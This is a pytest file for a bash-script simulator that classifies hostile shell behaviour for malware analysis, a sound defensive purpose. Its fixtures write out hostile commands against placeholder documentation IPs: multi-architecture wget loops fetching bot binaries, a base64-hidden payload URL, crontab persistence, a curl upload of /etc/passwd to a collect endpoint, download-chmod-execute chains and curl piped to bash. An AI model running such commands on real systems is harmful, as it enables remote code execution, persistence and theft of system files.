"""Pure interpreter tests. No AL framework, no network, no real bash -- calls
BashSimInterpreter().run(text) directly on synthetic fixtures using RFC 5737
documentation-range placeholder IPs, never real/live infrastructure.
"""
from bashsim.interpreter import BashSimInterpreter, has_multi_arch_pattern


def test_multi_arch_loop_resolves_each_url():
    script = (
        "for a in x86 mips mpsl arm; do\n"
        "  wget http://192.0.2.40/bins/x.$a -O k.$a\n"
        "done\n"
    )
    result = BashSimInterpreter().run(script)
    fetches = [a for a in result.actions if a.kind == "network_fetch"]
    assert len(fetches) == 4
    urls = {a.detail["url"] for a in fetches}
    assert urls == {
        "http://192.0.2.40/bins/x.x86",
        "http://192.0.2.40/bins/x.mips",
        "http://192.0.2.40/bins/x.mpsl",
        "http://192.0.2.40/bins/x.arm",
    }
    assert all(a.resolved for a in fetches)
    assert has_multi_arch_pattern(fetches) is True


def test_base64_command_substitution_resolves_url():
    # base64 of "http://192.0.2.60/payload"
    encoded = "aHR0cDovLzE5Mi4wLjIuNjAvcGF5bG9hZA=="
    script = f"u=$(echo -n '{encoded}' | base64 -d)\nwget $u\n"
    result = BashSimInterpreter().run(script)
    fetches = [a for a in result.actions if a.kind == "network_fetch"]
    assert len(fetches) == 1
    assert fetches[0].detail["url"] == "http://192.0.2.60/payload"
    assert fetches[0].resolved is True


def test_persistence_command_logged_as_system_mutation():
    script = 'crontab -l\necho "* * * * * /tmp/x" | crontab -\n'
    result = BashSimInterpreter().run(script)
    mutations = [a for a in result.actions if a.kind == "system_mutation"]
    assert len(mutations) == 2
    assert {a.command for a in mutations} == {"crontab"}


def test_exfil_upload_distinct_from_network_fetch():
    script = 'curl -F "file=@/etc/passwd" http://198.51.100.20/collect.php\n'
    result = BashSimInterpreter().run(script)
    assert len(result.actions) == 1
    a = result.actions[0]
    assert a.kind == "exfil_upload"
    assert a.detail["url"] == "http://198.51.100.20/collect.php"


def test_direct_execution_cross_references_prior_fetch():
    script = (
        "wget http://192.0.2.70/x -O /tmp/x\n"
        "chmod +x /tmp/x\n"
        "/tmp/x\n"
    )
    result = BashSimInterpreter().run(script)
    direct_execs = [a for a in result.actions if a.kind == "direct_execution"]
    assert len(direct_execs) == 1
    assert direct_execs[0].detail["target"] == "/tmp/x"
    assert "http://192.0.2.70/x" in direct_execs[0].detail.get("cross_reference", "")

    mutations = [a for a in result.actions if a.kind == "system_mutation"]
    assert len(mutations) == 1
    assert mutations[0].command == "chmod"


def test_conditional_action_flagged():
    script = 'if [ -f /tmp/marker ]; then\n  wget http://192.0.2.80/x\nfi\n'
    result = BashSimInterpreter().run(script)
    fetches = [a for a in result.actions if a.kind == "network_fetch"]
    assert len(fetches) == 1
    assert fetches[0].conditional is True


def test_shebang_only_script_returns_clean_empty_result():
    # bashlex's own AST-visitor crashes (AttributeError: 'str' object has no attribute
    # 'kind') on a script containing nothing but a shebang/comment -- a bug internal
    # to bashlex, not ours. We must short-circuit before calling bashlex.parse() on
    # genuinely-empty-of-real-code input rather than surface that crash.
    result = BashSimInterpreter().run("#!/bin/bash\n")
    assert result.actions == []
    assert result.parse_errors == []


def test_arithmetic_expansion_is_neutralized_not_fatal():
    # bashlex's grammar doesn't support $((...)). One unsupported construct anywhere
    # in a script must not discard analysis of the rest of an otherwise-ordinary script.
    script = "x=$((1+2))\nwget http://192.0.2.110/payload\n"
    result = BashSimInterpreter().run(script)
    fetches = [a for a in result.actions if a.kind == "network_fetch"]
    assert len(fetches) == 1
    assert fetches[0].detail["url"] == "http://192.0.2.110/payload"
    assert any("arithmetic expansion" in e for e in result.parse_errors)


def test_malformed_script_reports_parse_error_without_crashing():
    script = "if [ 1 -eq 1"  # deliberately unterminated/invalid construct
    result = BashSimInterpreter().run(script)
    assert result.actions == []
    assert len(result.parse_errors) >= 1


def test_curl_pipe_to_bare_shell_is_direct_execution_not_other_command():
    # The classic curl-pipe-to-shell RCE pattern: the fetched payload is piped straight
    # into a bare `sh`/`bash` with no file argument, reading the script from stdin.
    script = "curl -ks http://192.0.2.100/x | bash\n"
    result = BashSimInterpreter().run(script)
    kinds = [a.kind for a in result.actions]
    assert "direct_execution" in kinds
    direct = [a for a in result.actions if a.kind == "direct_execution"][0]
    assert direct.command == "bash"
    assert direct.detail["target"] == "<stdin>"
    assert "http://192.0.2.100/x" in direct.detail.get("cross_reference", "")
    # and it must NOT also be miscategorized as a low-signal other_command
    assert not any(a.kind == "other_command" and a.command == "bash" for a in result.actions)


def test_unresolvable_substitution_marked_unresolved_not_guessed():
    script = "u=$(curl http://192.0.2.90/whoami)\nwget $u\n"
    result = BashSimInterpreter().run(script)
    fetches = [a for a in result.actions if a.kind == "network_fetch" and a.command == "wget"]
    assert len(fetches) == 1
    assert fetches[0].resolved is False
